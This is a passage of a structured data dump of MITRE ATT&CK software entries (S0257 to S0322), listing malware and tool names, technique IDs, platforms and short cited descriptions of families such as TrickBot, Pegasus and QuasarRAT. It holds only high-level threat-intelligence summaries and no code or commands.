                          'Microsoft .NET framework. It is mostly composed of original code, but also has some open '
                          'source code. (Citation: Unit 42 VERMIN Jan 2018)',
           'name': 'VERMIN',
           'platforms': ['Windows'],
           'software_id': 'S0257',
           'type': 'malware'},
 'S0258': {'attack_ids': ['T1140', 'T1071', 'T1022', 'T1033', 'T1105', 'T1059'],
           'description': '[RGDoor](https://attack.mitre.org/software/S0258) is a malicious Internet Information '
                          'Services (IIS) backdoor developed in the C++ language. '
                          '[RGDoor](https://attack.mitre.org/software/S0258) has been seen deployed on webservers '
                          'belonging to the Middle East government organizations. '
                          '[RGDoor](https://attack.mitre.org/software/S0258) provides backdoor access to compromised '
                          'IIS servers. (Citation: Unit 42 RGDoor Jan 2018)',
           'name': 'RGDoor',
           'platforms': ['Windows'],
           'software_id': 'S0258',
           'type': 'malware'},
 'S0259': {'attack_ids': ['T1027', 'T1107', 'T1082', 'T1060', 'T1036', 'T1106', 'T1083', 'T1065', 'T1050', 'T1059'],
           'description': '[InnaputRAT](https://attack.mitre.org/software/S0259) is a remote access tool that can '
                          'exfiltrate files from a victim’s machine. '
                          '[InnaputRAT](https://attack.mitre.org/software/S0259) has been seen out in the wild since '
                          '2016. (Citation: ASERT InnaputRAT April 2018)',
           'name': 'InnaputRAT',
           'platforms': ['Windows'],
           'software_id': 'S0259',
           'type': 'malware'},
 'S0260': {'attack_ids': ['T1094',
                          'T1024',
                          'T1087',
                          'T1007',
                          'T1002',
                          'T1059',
                          'T1140',
                          'T1082',
                          'T1090',
                          'T1038',
                          'T1036',
                          'T1022',
                          'T1012',
                          'T1119',
                          'T1099',
                          'T1124',
                          'T1016',
                          'T1125',
                          'T1107',
                          'T1057',
                          'T1135',
                          'T1088',
                          'T1123',
                          'T1083',
                          'T1105',
                          'T1071',
                          'T1074',
                          'T1112',
                          'T1027',
                          'T1113',
                          'T1043',
                          'T1089',
                          'T1033'],
           'description': '[InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has '
                          'been used by threat actors since at least 2013. '
                          '[InvisiMole](https://attack.mitre.org/software/S0260) has two backdoor modules called RC2FM '
                          'and RC2CL that are used to perform post-exploitation activities. It has been discovered on '
                          'compromised victims in the Ukraine and Russia. (Citation: ESET InvisiMole June 2018)',
           'name': 'InvisiMole',
           'platforms': ['Windows'],
           'software_id': 'S0260',
           'type': 'malware'},
 'S0261': {'attack_ids': ['T1010', 'T1074', 'T1016', 'T1112', 'T1056', 'T1113', 'T1036', 'T1050', 'T1115'],
           'description': '[Catchamas](https://attack.mitre.org/software/S0261) is a Windows Trojan that steals '
                          'information from compromised systems. (Citation: Symantec Catchamas April 2018)',
           'name': 'Catchamas',
           'platforms': ['Windows'],
           'software_id': 'S0261',
           'type': 'malware'},
 'S0262': {'attack_ids': ['T1003',
                          'T1125',
                          'T1076',
                          'T1112',
                          'T1056',
                          'T1032',
                          'T1082',
                          'T1090',
                          'T1503',
                          'T1053',
                          'T1081',
                          'T1036',
                          'T1116',
                          'T1105',
                          'T1059'],
           'description': '[QuasarRAT](https://attack.mitre.org/software/S0262) is an open-source, remote access tool '
                          'that is publicly available on GitHub. [QuasarRAT](https://attack.mitre.org/software/S0262) '
                          'is developed in the C# language. (Citation: GitHub QuasarRAT) (Citation: Volexity Patchwork '
                          'June 2018)',
           'name': 'QuasarRAT',
           'platforms': ['Windows'],
           'software_id': 'S0262',
           'type': 'tool'},
 'S0263': {'attack_ids': ['T1140',
                          'T1094',
                          'T1107',
                          'T1027',
                          'T1112',
                          'T1031',
                          'T1090',
                          'T1082',
                          'T1043',
                          'T1064',
                          'T1089',
                          'T1083',
                          'T1065',
                          'T1204',
                          'T1050',
                          'T1105',
                          'T1059'],
           'description': '[TYPEFRAME](https://attack.mitre.org/software/S0263) is a remote access tool that has been '
                          'used by [Lazarus Group](https://attack.mitre.org/groups/G0032). (Citation: US-CERT '
                          'TYPEFRAME June 2018)',
           'name': 'TYPEFRAME',
           'platforms': ['Windows'],
           'software_id': 'S0263',
           'type': 'malware'},
 'S0264': {'attack_ids': ['T1140',
                          'T1071',
                          'T1124',
                          'T1047',
                          'T1107',
                          'T1027',
                          'T1074',
                          'T1053',
                          'T1082',
                          'T1132',
                          'T1045',
                          'T1064',
                          'T1030',
                          'T1041',
                          'T1002',
                          'T1497',
                          'T1105',
                          'T1059'],
           'description': '[OopsIE](https://attack.mitre.org/software/S0264) is a Trojan used by '
                          '[OilRig](https://attack.mitre.org/groups/G0049) to remotely execute commands as well as '
                          'upload/download files to/from victims. (Citation: Unit 42 OopsIE! Feb 2018)',
           'name': 'OopsIE',
           'platforms': ['Windows'],
           'software_id': 'S0264',
           'type': 'malware'},
 'S0265': {'attack_ids': ['T1055',
                          'T1087',
                          'T1029',
                          'T1059',
                          'T1047',
                          'T1485',
                          'T1082',
                          'T1132',
                          'T1005',
                          'T1102',
                          'T1050',
                          'T1125',
                          'T1107',
                          'T1016',
                          'T1069',
                          'T1057',
                          'T1083',
                          'T1105',
                          'T1071',
                          'T1010',
                          'T1027',
                          'T1074',
                          'T1008',
                          'T1060',
                          'T1113',
                          'T1033',
                          'T1023'],
           'description': '[Kazuar](https://attack.mitre.org/software/S0265) is a fully featured, multi-platform '
                          'backdoor Trojan written using the Microsoft .NET framework. (Citation: Unit 42 Kazuar May '
                          '2017)',
           'name': 'Kazuar',
           'platforms': ['Windows', 'macOS'],
           'software_id': 'S0265',
           'type': 'malware'},
 'S0266': {'attack_ids': ['T1087',
                          'T1024',
                          'T1055',
                          'T1053',
                          'T1482',
                          'T1007',
                          'T1106',
                          'T1204',
                          'T1140',
                          'T1185',
                          'T1082',
                          'T1503',
                          'T1005',
                          'T1065',
                          'T1016',
                          'T1114',
                          'T1064',
                          'T1083',
                          'T1105',
                          'T1071',
                          'T1027',
                          'T1112',
                          'T1081',
                          'T1060',
                          'T1045',
                          'T1043',
                          'T1089',
                          'T1179',
                          'T1214',
                          'T1193'],
           'description': '[TrickBot](https://attack.mitre.org/software/S0266) is a Trojan spyware program that has '
                          'mainly been used for targeting banking sites in United States, Canada, UK, Germany, '
                          'Australia, Austria, Ireland, London, Switzerland, and Scotland. TrickBot first emerged in '
                          'the wild in September 2016 and appears to be a successor to '
                          '[Dyre](https://attack.mitre.org/software/S0024). '
                          '[TrickBot](https://attack.mitre.org/software/S0266) is developed in the C++ programming '
                          'language. (Citation: S2 Grupo TrickBot June 2017) (Citation: Fidelis TrickBot Oct 2016) '
                          '(Citation: IBM TrickBot Nov 2016)',
           'name': 'TrickBot',
           'platforms': ['Windows'],
           'software_id': 'S0266',
           'type': 'malware'},
 'S0267': {'attack_ids': ['T1059',
                          'T1047',
                          'T1085',
                          'T1082',
                          'T1022',
                          'T1012',
                          'T1124',
                          'T1107',
                          'T1016',
                          'T1057',
                          'T1064',
                          'T1105',
                          'T1071',
                          'T1027',
                          'T1112',
                          'T1060',
                          'T1043',
                          'T1063',
                          'T1033',
                          'T1023'],
           'description': '[FELIXROOT](https://attack.mitre.org/software/S0267) is a backdoor that has been used to '
                          'target Ukrainian victims. (Citation: FireEye FELIXROOT July 2018)',
           'name': 'FELIXROOT',
           'platforms': ['Windows'],
           'software_id': 'S0267',
           'type': 'malware'},
 'S0268': {'attack_ids': ['T1140',
                          'T1071',
                          'T1024',
                          'T1027',
                          'T1085',
                          'T1032',
                          'T1107',
                          'T1082',
                          'T1016',
                          'T1060',
                          'T1057',
                          'T1043',
                          'T1064',
                          'T1105',
                          'T1059'],
           'description': '[Bisonal](https://attack.mitre.org/software/S0268) is malware that has been used in attacks '
                          'against targets in Russia, South Korea, and Japan. It has been observed in the wild since '
                          '2014. (Citation: Unit 42 Bisonal July 2018)',
           'name': 'Bisonal',
           'platforms': ['Windows'],
           'software_id': 'S0268',
           'type': 'malware'},
 'S0269': {'attack_ids': ['T1140',
                          'T1071',
                          'T1016',
                          'T1027',
                          'T1112',
                          'T1107',
                          'T1053',
                          'T1008',
                          'T1036',
                          'T1064',
                          'T1001',
                          'T1086',
                          'T1012',
                          'T1033',
                          'T1059'],
           'description': '[QUADAGENT](https://attack.mitre.org/software/S0269) is a PowerShell backdoor used by '
                          '[OilRig](https://attack.mitre.org/groups/G0049). (Citation: Unit 42 QUADAGENT July 2018)',
           'name': 'QUADAGENT',
           'platforms': ['Windows'],
           'software_id': 'S0269',
           'type': 'malware'},
 'S0270': {'attack_ids': ['T1094',
                          'T1117',
                          'T1059',
                          'T1047',
                          'T1140',
                          'T1082',
                          'T1102',
                          'T1086',
                          'T1016',
                          'T1057',
                          'T1064',
                          'T1001',
                          'T1497',
                          'T1105',
                          'T1027',
                          'T1113',
                          'T1060',
                          'T1063',
                          'T1033',
                          'T1023'],
           'description': '[RogueRobin](https://attack.mitre.org/software/S0270) is a payload used by '
                          '[DarkHydrus](https://attack.mitre.org/groups/G0079) that has been developed in PowerShell '
                          'and C#. (Citation: Unit 42 DarkHydrus July 2018)(Citation: Unit42 DarkHydrus Jan 2019)',
           'name': 'RogueRobin',
           'platforms': ['Windows'],
           'software_id': 'S0270',
           'type': 'malware'},
 'S0271': {'attack_ids': ['T1107',
                          'T1024',
                          'T1016',
                          'T1112',
                          'T1082',
                          'T1113',
                          'T1057',
                          'T1043',
                          'T1083',
                          'T1105',
                          'T1059'],
           'description': '[KEYMARBLE](https://attack.mitre.org/software/S0271) is a Trojan that has reportedly been '
                          'used by the North Korean government. (Citation: US-CERT KEYMARBLE Aug 2018)',
           'name': 'KEYMARBLE',
           'platforms': ['Windows'],
           'software_id': 'S0271',
           'type': 'malware'},
 'S0272': {'attack_ids': ['T1032', 'T1082', 'T1083', 'T1033', 'T1105'],
           'description': '[NDiskMonitor](https://attack.mitre.org/software/S0272) is a custom backdoor written in '
                          '.NET that appears to be unique to [Patchwork](https://attack.mitre.org/groups/G0040). '
                          '(Citation: TrendMicro Patchwork Dec 2017)',
           'name': 'NDiskMonitor',
           'platforms': ['Windows'],
           'software_id': 'S0272',
           'type': 'malware'},
 'S0273': {'attack_ids': ['T1055', 'T1090', 'T1113', 'T1057', 'T1086'],
           'description': '[Socksbot](https://attack.mitre.org/software/S0273) is a backdoor that  abuses Socket '
                          'Secure (SOCKS) proxies. (Citation: TrendMicro Patchwork Dec 2017)',
           'name': 'Socksbot',
           'platforms': ['Windows'],
           'software_id': 'S0273',
           'type': 'malware'},
 'S0274': {'attack_ids': ['T1159',
                          'T1098',
                          'T1152',
                          'T1136',
                          'T1107',
                          'T1016',
                          'T1074',
                          'T1217',
                          'T1005',
                          'T1043',
                          'T1036',
                          'T1141',
                          'T1142',
                          'T1002',
                          'T1105',
                          'T1158'],
           'description': '[Calisto](https://attack.mitre.org/software/S0274) is a macOS Trojan that opens a backdoor '
                          'on the compromised machine. [Calisto](https://attack.mitre.org/software/S0274) is believed '
                          'to have first been developed in 2016. (Citation: Securelist Calisto July 2018) (Citation: '
                          'Symantec Calisto July 2018)',
           'name': 'Calisto',
           'platforms': ['macOS'],
           'software_id': 'S0274',
           'type': 'malware'},
 'S0275': {'attack_ids': ['T1071', 'T1124', 'T1016', 'T1032', 'T1082', 'T1113', 'T1083', 'T1033', 'T1105', 'T1059'],
           'description': '[UPPERCUT](https://attack.mitre.org/software/S0275) is a backdoor that has been used by '
                          '[menuPass](https://attack.mitre.org/groups/G0045). (Citation: FireEye APT10 Sept 2018)',
           'name': 'UPPERCUT',
           'platforms': ['Windows'],
           'software_id': 'S0275',
           'type': 'malware'},
 'S0276': {'attack_ids': ['T1159', 'T1071', 'T1151', 'T1188', 'T1064', 'T1141', 'T1167', 'T1166'],
           'description': "This piece of malware steals the content of the user's keychain while maintaining a "
                          'permanent backdoor  (Citation: OSX Keydnap malware).',
           'name': 'Keydnap',
           'platforms': ['macOS'],
           'software_id': 'S0276',
           'type': 'malware'},
 'S0277': {'attack_ids': ['T1159', 'T1107', 'T1027', 'T1113', 'T1057', 'T1083', 'T1158'],
           'description': 'FruitFly is designed to spy on mac users  (Citation: objsee mac malware 2017).',
           'name': 'FruitFly',
           'platforms': ['macOS'],
           'software_id': 'S0277',
           'type': 'malware'},
 'S0278': {'attack_ids': ['T1016', 'T1163', 'T1057', 'T1141', 'T1142', 'T1002', 'T1158'],
           'description': '[iKitten](https://attack.mitre.org/software/S0278) is a macOS exfiltration agent  '
                          '(Citation: objsee mac malware 2017).',
           'name': 'iKitten',
           'platforms': ['macOS'],
           'software_id': 'S0278',
           'type': 'malware'},
 'S0279': {'attack_ids': ['T1159',
                          'T1140',
                          'T1107',
                          'T1056',
                          'T1503',
                          'T1206',
                          'T1081',
                          'T1113',
                          'T1021',
                          'T1089',
                          'T1141',
                          'T1064',
                          'T1070',
                          'T1002'],
           'description': '[Proton](https://attack.mitre.org/software/S0279) is a macOS backdoor focusing on data '
                          'theft and credential access  (Citation: objsee mac malware 2017).',
           'name': 'Proton',
           'platforms': ['macOS'],
           'software_id': 'S0279',
           'type': 'malware'},
 'S0280': {'attack_ids': ['T1140', 'T1082', 'T1038', 'T1043', 'T1033', 'T1059'],
           'description': '[MirageFox](https://attack.mitre.org/software/S0280) is a remote access tool used against '
                          'Windows systems. It appears to be an upgraded version of a tool known as Mirage, which is a '
                          'RAT believed to originate in 2012. (Citation: APT15 Intezer June 2018)',
           'name': 'MirageFox',
           'platforms': ['Windows'],
           'software_id': 'S0280',
           'type': 'malware'},
 'S0281': {'attack_ids': ['T1159', 'T1188', 'T1141', 'T1162', 'T1155', 'T1130'],
           'description': '[Dok](https://attack.mitre.org/software/S0281) steals banking information through '
                          'man-in-the-middle  (Citation: objsee mac malware 2017).',
           'name': 'Dok',
           'platforms': ['macOS'],
           'software_id': 'S0281',
           'type': 'malware'},
 'S0282': {'attack_ids': ['T1159', 'T1071', 'T1107', 'T1056', 'T1158', 'T1113', 'T1188', 'T1123', 'T1115'],
           'description': '[MacSpy](https://attack.mitre.org/software/S0282) is a malware-as-a-service offered on the '
                          'darkweb  (Citation: objsee mac malware 2017).',
           'name': 'MacSpy',
           'platforms': ['macOS'],
           'software_id': 'S0282',
           'type': 'malware'},
 'S0283': {'attack_ids': ['T1165',
                          'T1007',
                          'T1029',
                          'T1059',
                          'T1047',
                          'T1056',
                          'T1082',
                          'T1090',
                          'T1503',
                          'T1016',
                          'T1107',
                          'T1125',
                          'T1057',
                          'T1064',
                          'T1123',
                          'T1083',
                          'T1105',
                          'T1027',
                          'T1076',
                          'T1145',
                          'T1081',
                          'T1113',
                          'T1045',
                          'T1063',
                          'T1049',
                          'T1120',
                          'T1115'],
           'description': '[jRAT](https://attack.mitre.org/software/S0283) is a cross-platform, Java-based backdoor '
                          'originally available for purchase in 2012. Variants of '
                          '[jRAT](https://attack.mitre.org/software/S0283) have been distributed via a '
                          'software-as-a-service platform, similar to an online subscription model.(Citation: '
                          'Kaspersky Adwind Feb 2016) (Citation: jRAT Symantec Aug 2018)',
           'name': 'jRAT',
           'platforms': ['Linux', 'Windows', 'macOS', 'Android'],
           'software_id': 'S0283',
           'type': 'malware'},
 'S0284': {'attack_ids': ['T1140',
                          'T1071',
                          'T1107',
                          'T1016',
                          'T1082',
                          'T1132',
                          'T1022',
                          'T1116',
                          'T1117',
                          'T1063',
                          'T1033',
                          'T1105',
                          'T1059'],
           'description': '[More_eggs](https://attack.mitre.org/software/S0284) is a JScript backdoor used by [Cobalt '
                          'Group](https://attack.mitre.org/groups/G0080) and '
                          '[FIN6](https://attack.mitre.org/groups/G0037). Its name was given based on the variable '
                          '"More_eggs" being present in its code. There are at least two different versions of the '
                          'backdoor being used, version 2.0 and version 4.4. (Citation: Talos Cobalt Group July '
                          '2018)(Citation: Security Intelligence More Eggs Aug 2019)',
           'name': 'More_eggs',
           'platforms': ['Windows'],
           'software_id': 'S0284',
           'type': 'malware'},
 'S0285': {'attack_ids': ['T1398'],
           'description': '[OldBoot](https://attack.mitre.org/software/S0285) is an Android malware family. (Citation: '
                          'HackerNews-OldBoot)',
           'name': 'OldBoot',
           'platforms': ['Android'],
           'software_id': 'S0285',
           'type': 'malware'},
 'S0286': {'attack_ids': ['T1406', 'T1401'],
           'description': 'OBAD is an Android malware family. (Citation: TrendMicro-Obad)',
           'name': 'OBAD',
           'platforms': ['Android'],
           'software_id': 'S0286',
           'type': 'malware'},
 'S0287': {'attack_ids': ['T1407', 'T1476', 'T1475'],
           'description': '[ZergHelper](https://attack.mitre.org/software/S0287) is iOS riskware that was unique due '
                          "to its apparent evasion of Apple's App Store review process. No malicious functionality was "
                          'identified in the app, but it presents security risks. (Citation: Xiao-ZergHelper)',
           'name': 'ZergHelper',
           'platforms': ['iOS'],
           'software_id': 'S0287',
           'type': 'malware'},
 'S0288': {'attack_ids': ['T1410', 'T1446', 'T1426'],
           'description': '[KeyRaider](https://attack.mitre.org/software/S0288) is malware that steals Apple account '
                          'credentials and other data from jailbroken iOS devices. It also has ransomware '
                          'functionality. (Citation: Xiao-KeyRaider)',
           'name': 'KeyRaider',
           'platforms': ['iOS'],
           'software_id': 'S0288',
           'type': 'malware'},
 'S0289': {'attack_ids': ['T1433',
                          'T1438',
                          'T1477',
                          'T1400',
                          'T1422',
                          'T1412',
                          'T1432',
                          'T1404',
                          'T1426',
                          'T1429',
                          'T1409',
                          'T1430',
                          'T1456'],
           'description': '[Pegasus for iOS](https://attack.mitre.org/software/S0289) is the iOS version of malware '
                          'that has reportedly been linked to the NSO Group. It has been advertised and sold to target '
                          'high-value victims. (Citation: Lookout-Pegasus) (Citation: PegasusCitizenLab) The Android '
                          'version is tracked separately under [Pegasus for '
                          'Android](https://attack.mitre.org/software/S0316).',
           'name': 'Pegasus for iOS',
           'platforms': ['iOS'],
           'software_id': 'S0289',
           'type': 'malware'},
 'S0290': {'attack_ids': ['T1472', 'T1533', 'T1404'],
           'description': '[Gooligan](https://attack.mitre.org/software/S0290) is a malware family that runs privilege '
                          'escalation exploits on Android devices and then uses its escalated privileges to steal '
                          'authentication tokens that can be used to access data from many Google applications. '
                          '[Gooligan](https://attack.mitre.org/software/S0290) has been described as part of the Ghost '
                          'Push Android malware family. (Citation: Gooligan Citation) (Citation: Ludwig-GhostPush) '
                          '(Citation: Lookout-Gooligan)',
           'name': 'Gooligan',
           'platforms': ['Android'],
           'software_id': 'S0290',
           'type': 'malware'},
 'S0291': {'attack_ids': ['T1422', 'T1430', 'T1448'],
           'description': '[PJApps](https://attack.mitre.org/software/S0291) is an Android malware family. (Citation: '
                          'Lookout-EnterpriseApps)',
           'name': 'PJApps',
           'platforms': ['Android'],
           'software_id': 'S0291',
           'type': 'malware'},
 'S0292': {'attack_ids': ['T1433', 'T1412', 'T1432', 'T1429', 'T1430'],
           'description': '[AndroRAT](https://attack.mitre.org/software/S0292) is malware that allows a third party to '
                          'control the device and collect information. (Citation: Lookout-EnterpriseApps)',
           'name': 'AndroRAT',
           'platforms': ['Android'],
           'software_id': 'S0292',
           'type': 'malware'},
 'S0293': {'attack_ids': ['T1452', 'T1400', 'T1406', 'T1404', 'T1407'],
           'description': '[BrainTest](https://attack.mitre.org/software/S0293) is a family of Android malware. '
                          '(Citation: CheckPoint-BrainTest) (Citation: Lookout-BrainTest)',
           'name': 'BrainTest',
           'platforms': ['Android'],
           'software_id': 'S0293',
           'type': 'malware'},
 'S0294': {'attack_ids': ['T1400', 'T1404'],
           'description': '[ShiftyBug](https://attack.mitre.org/software/S0294) is an auto-rooting adware family of '
                          'malware for Android. The family is very similar to the other Android families known as '
                          'Shedun, Shuanet, Kemoge, though it is not believed all the families were created by the '
                          'same group. (Citation: Lookout-Adware)',
           'name': 'ShiftyBug',
           'platforms': ['Android'],
           'software_id': 'S0294',
           'type': 'malware'},
 'S0295': {'attack_ids': ['T1438', 'T1412', 'T1512', 'T1407', 'T1533', 'T1429', 'T1409', 'T1430', 'T1414'],
           'description': '[RCSAndroid](https://attack.mitre.org/software/S0295) is Android malware. (Citation: '
                          'TrendMicro-RCSAndroid)',
           'name': 'RCSAndroid',
           'platforms': ['Android'],
           'software_id': 'S0295',
           'type': 'malware'},
 'S0297': {'attack_ids': ['T1474', 'T1411', 'T1414'],
           'description': '[XcodeGhost](https://attack.mitre.org/software/S0297) is iOS malware that infected at least '
                          '39 iOS apps in 2015 and potentially affected millions of users. (Citation: '
                          'PaloAlto-XcodeGhost1) (Citation: PaloAlto-XcodeGhost)',
           'name': 'XcodeGhost',
           'platforms': ['iOS'],
           'software_id': 'S0297',
           'type': 'malware'},
 'S0298': {'attack_ids': ['T1412', 'T1411', 'T1446', 'T1471'],
           'description': '[Xbot](https://attack.mitre.org/software/S0298) is an Android malware family that was '
                          'observed in 2016 primarily targeting Android users in Russia and Australia. (Citation: '
                          'PaloAlto-Xbot)',
           'name': 'Xbot',
           'platforms': ['Android'],
           'software_id': 'S0298',
           'type': 'tool'},
 'S0299': {'attack_ids': ['T1428'],
           'description': '[NotCompatible](https://attack.mitre.org/software/S0299) is an Android malware family that '
                          'was used between at least 2014 and 2016. It has multiple variants that have become more '
                          'sophisticated over time. (Citation: Lookout-NotCompatible)',
           'name': 'NotCompatible',
           'platforms': ['Android'],
           'software_id': 'S0299',
           'type': 'malware'},
 'S0300': {'attack_ids': ['T1428'],
           'description': '[DressCode](https://attack.mitre.org/software/S0300) is an Android malware family. '
                          '(Citation: TrendMicro-DressCode)',
           'name': 'DressCode',
           'platforms': ['Android'],
           'software_id': 'S0300',
           'type': 'malware'},
 'S0301': {'attack_ids': ['T1512', 'T1429'],
           'description': '[Dendroid](https://attack.mitre.org/software/S0301) is an Android malware family. '
                          '(Citation: Lookout-Dendroid)',
           'name': 'Dendroid',
           'platforms': ['Android'],
           'software_id': 'S0301',
           'type': 'malware'},
 'S0302': {'attack_ids': ['T1102'],
           'description': '[Twitoor](https://attack.mitre.org/software/S0302) is an Android malware family that likely '
                          'spreads by SMS or via malicious URLs. (Citation: ESET-Twitoor)',
           'name': 'Twitoor',
           'platforms': ['Android'],
           'software_id': 'S0302',
           'type': 'malware'},
 'S0303': {'attack_ids': ['T1412', 'T1476', 'T1448'],
           'description': '[MazarBOT](https://attack.mitre.org/software/S0303) is Android malware that was distributed '
                          'via SMS in Denmark in 2016. (Citation: Tripwire-MazarBOT)',
           'name': 'MazarBOT',
           'platforms': ['Android'],
           'software_id': 'S0303',
           'type': 'malware'},
 'S0304': {'attack_ids': ['T1433', 'T1438', 'T1412', 'T1432', 'T1426', 'T1437', 'T1430', 'T1476'],
           'description': '[Android/Chuli.A](https://attack.mitre.org/software/S0304) is Android malware that was '
                          'delivered to activist groups via a spearphishing email with an attachment. (Citation: '
                          'Kaspersky-WUC)',
           'name': 'Android/Chuli.A',
           'platforms': ['Android'],
           'software_id': 'S0304',
           'type': 'malware'},
 'S0305': {'attack_ids': ['T1412', 'T1432', 'T1402', 'T1533', 'T1429', 'T1430'],
           'description': '[SpyNote RAT](https://attack.mitre.org/software/S0305) (Remote Access Trojan) is a family '
                          'of malicious Android apps. The [SpyNote RAT](https://attack.mitre.org/software/S0305) '
                          "builder tool can be used to develop malicious apps with the malware's functionality. "
                          '(Citation: Zscaler-SpyNote)',
           'name': 'SpyNote RAT',
           'platforms': ['Android'],
           'software_id': 'S0305',
           'type': 'malware'},
 'S0306': {'attack_ids': ['T1437'],
           'description': '[Trojan-SMS.AndroidOS.FakeInst.a](https://attack.mitre.org/software/S0306) is Android '
                          'malware. (Citation: Kaspersky-MobileMalware)',
           'name': 'Trojan-SMS.AndroidOS.FakeInst.a',
           'platforms': ['Android'],
           'software_id': 'S0306',
           'type': 'malware'},
 'S0307': {'attack_ids': ['T1437'],
           'description': '[Trojan-SMS.AndroidOS.Agent.ao](https://attack.mitre.org/software/S0307) is Android '
                          'malware. (Citation: Kaspersky-MobileMalware)',
           'name': 'Trojan-SMS.AndroidOS.Agent.ao',
           'platforms': ['Android'],
           'software_id': 'S0307',
           'type': 'malware'},
 'S0308': {'attack_ids': ['T1437'],
           'description': '[Trojan-SMS.AndroidOS.OpFake.a](https://attack.mitre.org/software/S0308) is Android '
                          'malware. (Citation: Kaspersky-MobileMalware)',
           'name': 'Trojan-SMS.AndroidOS.OpFake.a',
           'platforms': ['Android'],
           'software_id': 'S0308',
           'type': 'malware'},
 'S0309': {'attack_ids': ['T1433', 'T1412', 'T1432', 'T1474', 'T1430'],
           'description': '[Adups](https://attack.mitre.org/software/S0309) is software that was pre-installed onto '
                          'Android devices, including those made by BLU Products. The software was reportedly designed '
                          'to help a Chinese phone manufacturer monitor user behavior, transferring sensitive data to '
                          'a Chinese server. (Citation: NYTimes-BackDoor) (Citation: BankInfoSecurity-BackDoor)',
           'name': 'Adups',
           'platforms': ['Android'],
           'software_id': 'S0309',
           'type': 'malware'},
 'S0310': {'attack_ids': ['T1481', 'T1422', 'T1426'],
           'description': '[ANDROIDOS_ANSERVER.A](https://attack.mitre.org/software/S0310) is Android malware that is '
                          'unique because it uses encrypted content within a blog site for command and control. '
                          '(Citation: TrendMicro-Anserver)',
           'name': 'ANDROIDOS_ANSERVER.A',
           'platforms': ['Android'],
           'software_id': 'S0310',
           'type': 'malware'},
 'S0311': {'attack_ids': ['T1476'],
           'description': '[YiSpecter](https://attack.mitre.org/software/S0311) iOS malware that affects both '
                          'jailbroken and non-jailbroken iOS devices. It is also unique because it abuses private APIs '
                          'in the iOS system to implement functionality. (Citation: PaloAlto-YiSpecter)',
           'name': 'YiSpecter',
           'platforms': ['iOS'],
           'software_id': 'S0311',
           'type': 'malware'},
 'S0312': {'attack_ids': ['T1406', 'T1458'],
           'description': '[WireLurker](https://attack.mitre.org/software/S0312) is a family of macOS malware that '
                          'targets iOS devices connected over USB. (Citation: PaloAlto-WireLurker)',
           'name': 'WireLurker',
           'platforms': ['iOS'],
           'software_id': 'S0312',
           'type': 'malware'},
 'S0313': {'attack_ids': ['T1422', 'T1412', 'T1426', 'T1437', 'T1476'],
           'description': '[RuMMS](https://attack.mitre.org/software/S0313) is an Android malware family. (Citation: '
                          'FireEye-RuMMS)',
           'name': 'RuMMS',
           'platforms': ['Android'],
           'software_id': 'S0313',
           'type': 'malware'},
 'S0314': {'attack_ids': ['T1430', 'T1444'],
           'description': '[X-Agent for Android](https://attack.mitre.org/software/S0314) is Android malware that was '
                          'placed in a repackaged version of a Ukrainian artillery targeting application. The malware '
                          'reportedly retrieved general location data on where the victim device was used, and '
                          'therefore could likely indicate the potential location of Ukrainian artillery. (Citation: '
                          'CrowdStrike-Android) Is it tracked separately from the '
                          '[CHOPSTICK](https://attack.mitre.org/software/S0023).',
           'name': 'X-Agent for Android',
           'platforms': ['Android'],
           'software_id': 'S0314',
           'type': 'malware'},
 'S0315': {'attack_ids': ['T1458', 'T1422'],
           'description': '[DualToy](https://attack.mitre.org/software/S0315) is Windows malware that installs '
                          'malicious applications onto Android and iOS devices connected over USB. (Citation: '
                          'PaloAlto-DualToy)',
           'name': 'DualToy',
           'platforms': ['Android', 'iOS'],
           'software_id': 'S0315',
           'type': 'malware'},
 'S0316': {'attack_ids': ['T1433',
                          'T1438',
                          'T1400',
                          'T1422',
                          'T1512',
                          'T1432',
                          'T1402',
                          'T1435',
                          'T1475',
                          'T1404',
                          'T1429',
                          'T1409',
                          'T1418'],
           'description': '[Pegasus for Android](https://attack.mitre.org/software/S0316) is the Android version of '
                          'malware that has reportedly been linked to the NSO Group. (Citation: '
                          'Lookout-PegasusAndroid) (Citation: Google-Chrysaor) The iOS version is tracked separately '
                          'under [Pegasus for iOS](https://attack.mitre.org/software/S0289).',
           'name': 'Pegasus for Android',
           'platforms': ['Android'],
           'software_id': 'S0316',
           'type': 'malware'},
 'S0317': {'attack_ids': ['T1401', 'T1411', 'T1476'],
           'description': '[Marcher](https://attack.mitre.org/software/S0317) is Android malware that is used for '
                          'financial fraud. (Citation: Proofpoint-Marcher)',
           'name': 'Marcher',
           'platforms': ['Android'],
           'software_id': 'S0317',
           'type': 'malware'},
 'S0318': {'attack_ids': ['T1406', 'T1429', 'T1412', 'T1401'],
           'description': '[XLoader](https://attack.mitre.org/software/S0318) is a malicious Android app that was '
                          'observed targeting Japan, Korea, China, Taiwan, and Hong Kong in 2018. (Citation: '
                          'TrendMicro-XLoader)',
           'name': 'XLoader',
           'platforms': ['Android'],
           'software_id': 'S0318',
           'type': 'malware'},
 'S0319': {'attack_ids': ['T1474'],
           'description': '[Allwinner](https://attack.mitre.org/software/S0319) is a company that supplies processors '
                          'used in Android tablets and other devices. A Linux kernel distributed by '
                          '[Allwinner](https://attack.mitre.org/software/S0319) for use on these devices reportedly '
                          'contained a backdoor. (Citation: HackerNews-Allwinner)',
           'name': 'Allwinner',
           'platforms': ['Android'],
           'software_id': 'S0319',
           'type': 'malware'},
 'S0320': {'attack_ids': ['T1433', 'T1412', 'T1512', 'T1444', 'T1429'],
           'description': '[DroidJack](https://attack.mitre.org/software/S0320) is an Android remote access tool that '
                          'has been observed posing as legitimate applications including the Super Mario Run and '
                          'Pokemon GO games. (Citation: Zscaler-SuperMarioRun) (Citation: Proofpoint-Droidjack)',
           'name': 'DroidJack',
           'platforms': ['Android'],
           'software_id': 'S0320',
           'type': 'malware'},
 'S0321': {'attack_ids': ['T1472'],
           'description': '[HummingWhale](https://attack.mitre.org/software/S0321) is an Android malware family that '
                          'performs ad fraud. (Citation: ArsTechnica-HummingWhale)',
           'name': 'HummingWhale',
           'platforms': ['Android'],
           'software_id': 'S0321',
           'type': 'malware'},
 'S0322': {'attack_ids': ['T1472', 'T1452', 'T1404'],
           'description': '[HummingBad](https://attack.mitre.org/software/S0322) is a family of Android malware that '
                          'generates fraudulent advertising revenue and has the ability to obtain root access on '
                          'older, vulnerable versions of Android. (Citation: ArsTechnica-HummingBad)',
           'name': 'HummingBad',
           'platforms': ['Android'],
           'software_id': 'S0322',
           'type': 'malware'},
